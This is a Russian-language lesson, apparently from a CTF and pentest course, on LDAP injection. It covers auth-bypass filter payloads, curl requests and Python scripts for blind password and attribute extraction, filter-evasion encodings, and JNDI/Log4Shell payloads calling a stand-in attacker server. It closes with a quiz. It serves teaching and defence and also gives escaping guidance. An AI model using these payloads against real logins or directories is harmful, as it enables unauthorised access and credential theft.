---
id: web-ldap-injection
title: "LDAP-инъекции: фильтры, обход аутентификации, слепая эксфильтрация"
category: web
parent: web-nosql-ldap-xpath
difficulty: medium
order: 2
tags: [ldap, injection, auth, filter, directory]
prerequisites: [web-nosql-ldap-xpath]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "LDAP-инъекции: манипуляция фильтрами, обход логина через wildcard/OR, слепое извлечение через атрибуты."
---

LDAP-инъекция возникает, когда пользовательский ввод конкатенируется в **LDAP-фильтр** или в **DN** (Distinguished Name) при аутентификации/bind. Классика — форма логина, которая ищет пользователя фильтром `(&(uid=USER)(userPassword=PASS))`: подставив `*)(uid=*))(|(uid=*`, можно обойти проверку пароля. Кроме обхода аутентификации LDAP-инъекция позволяет перечислять пользователей/группы и слепо извлекать значения атрибутов (пароли, токены, описания). Встречается в Active Directory-порталах, корпоративных каталогах и Java/PHP/.NET-приложениях на LDAP.

## Теория: LDAP-фильтры и точка инъекции

LDAP-фильтр имеет вид `(<attr><op><value>)`, где `op` ∈ `=`, `>=`, `<=`, `~=`, `=*` (presence). Фильтры комбинируются `&` (AND), `|` (OR), `!` (NOT). Уязвимый код:

```java
String filter = "(&(uid=" + user + ")(userPassword=" + pass + "))";
```

Если `user` = `*)(uid=*))(|(uid=*`, фильтр становится всегда истинным — вход без пароля:

```ldap
(&(uid=*)(uid=*))(|(uid=*)(userPassword=...))
```

## Синтаксис LDAP-фильтра

| Конструкция | Значение |
|-------------|----------|
| `*` | wildcard (любая строка) |
| `(attr=*)` | присутствие атрибута |
| `(attr=a*b*c)` | маска |
| `(&(...)(...))` | AND |
| `(\|(...)(...))` | OR |
| `(!(...))` | NOT |
| `)(` | закрыть/открыть фильтр (разрыв) |
| `\2a` | экранирование `*` |
| `\28`/`\29` | экранирование `(`/`)` |
| `\00` | null-байт |

Экранирование спецсимволов (`(`, `)`, `*`, `\`, NUL) — правильная защита; его отсутствие = инъекция.

## Вектор 1: обход аутентификации

```text
username=*)(uid=*))(|(uid=*
password=x
username=admin)(&)
username=admin)(|(password=*
password=*)(uid=*))(|(uid=*
```

Обход «любой пользователь / любой пароль»:

```text
username=*)(|(uid=*
password=whatever
```

## Вектор 2: слепая эксфильтрация атрибутов

Если приложение различает «пользователь найден / не найден», извлекаем значения через wildcard-условия:

```text
username=admin)(userPassword=a*
username=admin)(userPassword=b*
...
username=admin)(description=*flag*
```

По разнице ответов подбираем символы (boolean-blind). Дополнительно можно искать любые атрибуты: `(objectClass=*)`, `(mail=*@corp*)`.

## Вектор 3: перечисление пользователей/групп

```text
username=*
username=a*
username=admin*
(&(objectClass=person)(uid=*))
(&(objectClass=group)(cn=*admin*))
```

Вывод списка в ответе (например, «найдено N пользователей») даёт enumeration; совмещая с wildcard — извлекаем имена.

## Вектор 4: инъекция в bind DN

Если приложение строит DN для bind из ввода: `cn=USER,ou=users,dc=corp` — можно попытаться подставить свой DN или обойти: `cn=admin,ou=users,dc=corp` при известной структуре, либо null-байт (`admin\00`), если нижележащий код на C (некоторые биндинги обрезают строку по NUL).

## Разобранный пример: обход логина

Шаг 1 — проверка wildcard:

```bash
curl -s -X POST https://app.example/login --data-urlencode "username=*" --data-urlencode "password=x"
# если вернулся профиль/успех -> фильтр не экранирует *
```

Шаг 2 — обход:

```bash
curl -s -X POST https://app.example/login \
  --data-urlencode 'username=*)(uid=*))(|(uid=*' --data-urlencode "password=x" -c cookies.txt
```

Шаг 3 — если выдало сессию/админский профиль — вход выполнен. Часто достаточно `username=admin)(&)` или `username=admin)(|(password=*`.

## Разобранный пример: blind attribute extraction

Заготовка для подбора пароля по wildcard:

```python
import requests, string
url = "https://app.example/login"
def ok(prefix):
    r = requests.post(url, data={"username": f"admin)(userPassword={prefix}*", "password": "x"})
    return "invalid" not in r.text   # подстройте под признак успеха
pw = ""
for i in range(0, 40):
    for c in string.ascii_letters + string.digits + "{}_":
        if ok(pw + c):
            pw += c; break
    else:
        break
print("password:", pw)
```

Аналогично извлекаются `description`, `mail`, `memberOf` — ищите атрибуты, содержащие флаги/токены.

## Контексты инъекции

- Формы логина/поиска по LDAP/AD.
- Параметры `user=`, `login=`, `dn=`, `filter=`, `search=`.
- Java (`InitialDirContext.search`), PHP (`ldap_search`), .NET (`DirectorySearcher`), Python (`ldap3`).
- Корпоративные порталы, VPN-порталы, SSO на LDAP.
- Признаки в ошибках: `javax.naming.directory`, `LDAPException`, `ldap_search()`, `Invalid DN syntax`, `NamingException`.

## Инструменты

- **`curl`** — ручные payload.
- **Burp Intruder** — перебор wildcard-символов при blind.
- **`ldapsearch`** — понимание структуры каталога (если есть анонимный bind).
- **`jndi-explorer`/`ldapdomaindump`** — для AD-каталогов.
- **`ffuf`** — поиск эндпоинтов с LDAP-параметрами.

## Что дальше / decision

1. Параметр уходит в LDAP → проверьте `*` (wildcard не экранирован?).
2. Есть wildcard → обход логина `*)(uid=*))(|(uid=*`.
3. Вывод скрыт, но различается → blind-извлечение атрибутов.
4. Нашли AD/LDAP-структуру → enumeration пользователей/групп.
5. Дальше — эскалация к JNDI (если Java + `InitialContext.lookup` с управляемым вводом) → RCE.

## Частые ошибки

- **Путать с SQLi.** Другой синтаксис и операторы.
- **Не проверить wildcard.** Начинайте с `*` — это самый быстрый тест.
- **Забыть про экранирование.** Правильная защита экранирует `( ) * \ NUL` — если оно есть, вектор закрыт.
- **Сдаваться без вывода.** Используйте boolean-blind.
- **Игнорировать bind DN.** Инъекция может быть не в фильтре, а в DN.
- **Ломать прод.** Только с согласия.

## Полный разбор: blind LDAP extraction (с выводом)

End-to-end извлечение пароля/атрибута, когда приложение лишь различает «найден/не найден».

Шаг 1. Подтверждаем wildcard-инъекцию:

```bash
curl -s -X POST https://app.example/login --data-urlencode 'username=*' --data-urlencode 'password=x' | head -c 60
# {"error":"invalid password"}   -> '*' не экранирован (иначе было бы invalid user)
```

Шаг 2. Проверяем обход:

```bash
curl -s -X POST https://app.example/login \
  --data-urlencode 'username=admin)(|(uid=*' --data-urlencode 'password=x' -c c.txt
# {"ok":true,"role":"admin"}   -> вход выполнен
```

Шаг 3. Извлекаем атрибут (например, `description`, где лежит флаг/токен). Строим oracle:

```python
import requests, string
URL="https://app.example/login"
def found(cond):
    r=requests.post(URL, data={"username": f"admin)({cond}", "password":"x"})
    return '"ok":true' in r.text
# длина
L=None
for n in range(1,80):
    if found(f"description=*") and not found(f"description=?"): pass
# посимвольно по префиксу (wildcard-маска)
val=""
for i in range(1,80):
    for c in string.ascii_letters+string.digits+"{}_-@.":
        if found(f"description={val}{c}*"):
            val+=c; print(val); break
    else:
        break
print("attr:", val)
# flag{ld4p_1nj3ct10n}
```

Вывод по шагам: `f`, `fl`, `fla`, `flag`, `flag{`, … — пока не найдётся ни одного продолжения (строка кончилась).

Шаг 4. Аналогично перечисляем пользователей (`username=a*`, `b*`, …) и атрибуты (`mail=*@corp*`, `memberOf=*admin*`). Найденные креды/токены фиксируем как артефакт.

## Reference-таблица: LDAP-спецсимволы и их экранирование

| Символ | Смысл в фильтре | Экранирование |
|--------|-----------------|---------------|
| `*` | wildcard | `\2a` |
| `(` | открыть фильтр | `\28` |
| `)` | закрыть фильтр | `\29` |
| `\` | escape | `\5c` |
| NUL | обрыв строки (C-биндинги) | `\00` |
| `&` | AND | (не спецсимвол, но часть синтаксиса) |
| `\|` | OR | (часть синтаксиса) |
| `!` | NOT | (часть синтаксиса) |
| `=` | оператор | (часть синтаксиса) |

Правильная защита — экранировать все пять (`\ * ( ) NUL`) в значениях фильтра и не конкатенировать DN. Отсутствие любого = вектор.

## LDAP + JNDI: от инъекции к RCE

В Java-приложениях LDAP-поиск часто соседствует с **JNDI**. Если ввод уходит в `InitialContext.lookup(userInput)` (или в атрибут, который затем передаётся в lookup), возможна атака JNDI-injection (CVE-2021-44228-класс, Log4Shell — тот же принцип):

```java
// уязвимо
ctx.lookup(userInput);
```

Payload-схемы:

```
ldap://attacker:1389/Exploit
rmi://attacker:1099/Exploit
ldaps://...
```

Атакующий поднимает LDAP/RMI-сервер, отдающий ссылку на вредоносный Java-класс; целевая JVM его загружает и исполняет (если версия Java уязвима). Через **Log4Shell** инъекция в любую логируемую строку (`${jndi:ldap://attacker/x}`) даёт RCE. Проверяйте: логи, User-Agent, заголовки, поля форм — всё, что логируется.

Инструменты: `rogue-jndi`, `JNDIExploit`, `marshalsec`. Запускайте на своём хосте, репойнтите колбэки на себя, оценивайте, не уронит ли цель.

## Обход фильтров/экранирования

- **Частичное экранирование:** если фильтруют `*`, но не `(`, используйте `)(uid=*` без звёздочки (присутствие атрибута).
- **Двойное кодирование:** `%252a` → `%2a` → `*` после двойного декодирования.
- **Unicode/overlong:** `\uff0a`, overlong UTF-8 для `*` (в старых парсерах).
- **NUL-байт:** `admin\00` — некоторые C-биндинги обрезают строку (обход сравнения).
- **Регистр/пробелы:** `(& (uid=...` (пробел), регистр атрибутов (`UID` vs `uid`) — зависит от сервера.
- **Разные кодировки:** `%c0%aa` и подобные — против наивных валидаторов.
- **Инъекция в DN:** `cn=admin,ou=users,dc=corp` — если структура известна; либо `*` в DN.

## Что делать дальше / решение

1. **Проверить `*`** в параметре логина/поиска — быстрый тест на wildcard.
2. **Обход логина** payload'ом `*)(uid=*))(|(uid=*` или `admin)(|(password=*`.
3. **Blind extraction** через wildcard-маску (`attr=prefix*`).
4. **Enumeration** пользователей/групп/атрибутов.
5. **Java-стек?** — проверить JNDI/lookup и Log4j (`${jndi:...}`) на всех логируемых полях.
6. **Зафиксировать** найденные креды/токены и при JNDI — построить PoC RCE (на своём сервере).
7. **Записать артефакт** (скрипт-оракул) для повторного использования.

## LDAP-инъекция в bind: DN и null-byte

Инъекция бывает не только в фильтре, но и в **DN** (bind DN) — если приложение строит его из ввода:

```java
ctx = new InitialDirContext(env);  // env: "java.naming.security.principal" = "cn=" + user + ",ou=users,dc=corp"
```

Приёмы:

- **Подстановка своего DN:** если структура известна, `cn=admin,ou=admins,dc=corp` вместо пользователя.
- **Пустой/анонимный bind:** пустой DN и пароль иногда дают анонимный доступ к каталогу (read-only) — перечисление пользователей.
- **NUL-байт:** `admin\00,ou=users,...` — C-биндинги (OpenLDAP) обрезают строку по NUL, и остаток DN игнорируется → обход сравнения.
- **Экранирование DN:** спецсимволы DN (`,` `=` `+` `<` `>` `#` `;` `"` `\`) должны экранироваться; их отсутствие позволяет добавить свой RDN (`cn=x,ou=admins,...`).
- **SASL/анонимный bind:** проверьте, разрешён ли анонимный bind — он часто даёт `ldapsearch` без пароля.

Проверка анонимного доступа:

```bash
ldapsearch -x -H ldap://target.local:389 -b 'dc=corp,dc=local' '(objectClass=user)' cn mail
```

Если отдаёт пользователей — каталог открыт, и это самостоятельная находка (information disclosure), даже без инъекции.

## Квиз

```quiz
- question: "Что такое LDAP-фильтр?"
  options:
    - "SQL-запрос"
    - "Префиксное логическое выражение (&(a=1)(b=2))"
    - "JSON"
    - "XML"
  answer: 1
  explanation: "LDAP использует префиксную логику."
- question: "Какой payload часто обходит LDAP-логин?"
  options:
    - "' OR 1=1--"
    - "*)(uid=*))(|(uid=*"
    - '{"$ne":null}'
    - "../../etc/passwd"
  answer: 1
  explanation: "Ломает фильтр и делает условие истинным."
- question: "Как извлечь атрибут вслепую?"
  options:
    - "SELECT"
    - "Подбор через wildcard: userPassword=ab*"
    - "UNION"
    - "sleep"
  answer: 1
  explanation: "Бинарный сигнал успеха/неудачи."
- question: "Почему важно URL-кодирование?"
  options:
    - "Для скорости"
    - "Спецсимволы (*, (, )) иначе искажают запрос"
    - "Для TLS"
    - "Для cookie"
  answer: 1
  explanation: "Символы фильтра нужно кодировать."
- question: "Как LDAP-инъекция опасна в корпоративной среде?"
  options:
    - "Никак"
    - "Каталог связан с AD — обход логина даёт учётку домена"
    - "Только DoS"
    - "Только enumeration"
  answer: 1
  explanation: "LDAP часто = Active Directory."
```

## Где пригодится

- **CTF (Web):** задачи на LDAP-логин.
- **Bug bounty:** обход аутентификации — критичный отчёт.
- **Пентест:** аудит enterprise-приложений с AD.
- **Работа (AppSec):** экранирование LDAP-спецсимволов, параметризация фильтров, минимум прав для bind.
